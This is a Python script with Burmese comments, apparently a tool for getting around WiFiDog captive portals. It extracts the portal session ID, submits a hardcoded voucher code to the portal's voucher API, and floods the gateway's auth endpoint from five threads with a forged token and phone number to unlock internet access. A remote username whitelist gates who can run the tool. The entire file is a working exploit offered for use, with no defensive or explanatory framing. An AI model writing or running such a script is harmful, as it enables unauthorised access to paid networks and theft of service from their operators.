import requests
import re
import urllib3
import time
import threading
import os
import sys
import psutil # <--- Live Usage ကြည့်ရန်လိုအပ်ပါသည်
from urllib.parse import urlparse, parse_qs, urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- CONFIGURATION ---
WHITELIST_URL = "https://raw.githubusercontent.com/winhtetaung1662004-byte/win/main/keys.txt"
PING_THREADS = 5
PING_INTERVAL = 0.1 

def get_data_usage():
    """လက်ရှိ အသုံးပြုနေတဲ့ Total Data Usage (MB) ကို တွက်ချက်ရန်"""
    try:
        net_io = psutil.net_io_counters()
        total_bytes = net_io.bytes_sent + net_io.bytes_recv
        return total_bytes / (1024 * 1024)
    except: return 0

def check_approval():
    """Device ID ကို keys.txt နဲ့ တိုက်စစ်ခြင်း"""
    try:
        device_id = os.popen("id -u -n").read().strip()
        print(f"[*] Checking Approval for: {device_id}...")
        
        headers = {'Cache-Control': 'no-cache', 'Pragma': 'no-cache'}
        response = requests.get(WHITELIST_URL, headers=headers, timeout=10)
        
        allowed_users = response.text.splitlines()
        
        if device_id in allowed_users:
            print("[+] Access Granted!")
            time.sleep(1)
            return True
        else:
            print(f"\n[!] Access Denied! ID: {device_id} is not registered.")
            print("[*] Contact Admin to get approval.")
            sys.exit()
    except Exception as e:
        print(f"[!] Security Check Error: {e}")
        sys.exit()

def check_real_internet():
    try:
        return requests.get("http://www.google.com", timeout=3).status_code == 200
    except: return False

def high_speed_ping(auth_link, session, sid):
    """Auth Link ကို အဆက်မပြတ် Request ပို့ပေးခြင်း"""
    while True:
        try:
            res = session.get(auth_link, timeout=5)
            # ဒီနေရာမှာ Live Status ပြသည်
            print(f"[{time.strftime('%H:%M:%S')}] Pinging SID: {sid} (Status: OK)   ", end='\r')
        except: break
        time.sleep(PING_INTERVAL)

def start_process():
    # Approval စစ်ဆေးခြင်း
    check_approval()
    
    print(f"[{time.strftime('%H:%M:%S')}] Turbo Script with Voucher Initialization...")
    
    # 1 နှိပ်ခိုင်းသည့် menu
    print("\n[1] Start Internet Access")
    print("[0] Exit")
    choice = input("\nSelect Option: ")
    if choice != '1':
        print("Exiting...")
        sys.exit()
        
    start_time = time.time()
    start_data = get_data_usage()

    while True:
        session = requests.Session()
        test_url = "http://connectivitycheck.gstatic.com/generate_204"
        
        try:
            r = requests.get(test_url, allow_redirects=True, timeout=5)
            if r.url == test_url:
                if check_real_internet():
                    # Live Time and Data Usage
                    elapsed = time.time() - start_time
                    mins, secs = divmod(int(elapsed), 60)
                    hours, mins = divmod(mins, 60)
                    current_data = get_data_usage() - start_data
                    print(f"[*] Time: {hours:02d}:{mins:02d}:{secs:02d} | Used: {current_data:.2f} MB | Status: OK   ", end='\r')
                    time.sleep(5)
                    continue
            
            portal_url = r.url
            parsed_portal = urlparse(portal_url)
            portal_host = f"{parsed_portal.scheme}://{parsed_portal.netloc}"
            
            # ၁။ SID ရှာဖွေခြင်း
            r1 = session.get(portal_url, verify=False, timeout=10)
            path_match = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", r1.text)
            next_url = urljoin(portal_url, path_match.group(1)) if path_match else portal_url
            r2 = session.get(next_url, verify=False, timeout=10)
            
            sid = parse_qs(urlparse(r2.url).query).get('sessionId', [None])[0]
            if not sid:
                sid_match = re.search(r'sessionId=([a-zA-Z0-9]+)', r2.text)
                sid = sid_match.group(1) if sid_match else None
            
            if sid:
                # ၂။ Voucher ကို တစ်ကြိမ် "မဖြစ်မနေ" အရင်စမ်းသပ်ခြင်း
                print(f"\n[*] Activating Session with Voucher API...")
                voucher_api = f"{portal_host}/api/auth/voucher/"
                try:
                    # accessCode နေရာတွင် 123456 အပြင် လိုအပ်ပါက ပြောင်းလဲနိုင်သည်
                    v_res = session.post(voucher_api, json={'accessCode': '123456', 'sessionId': sid, 'apiVersion': 1}, timeout=5)
                    print(f"[+] Voucher API Response: {v_res.status_code}")
                except:
                    print("[!] Voucher API Failed (Gateway might not require it)")

                # ၃။ Gateway Info ယူပြီး Ping ထိုးခြင်း
                params = parse_qs(parsed_portal.query)
                gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
                gw_port = params.get('gw_port', ['2060'])[0]
                auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}&phonenumber=12345"

                print(f"[*] SID: {sid} | Starting {PING_THREADS} Turbo Threads...")

                for _ in range(PING_THREADS):
                    threading.Thread(target=high_speed_ping, args=(auth_link, session, sid), daemon=True).start()

                while check_real_internet():
                    time.sleep(5)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    start_process()
    
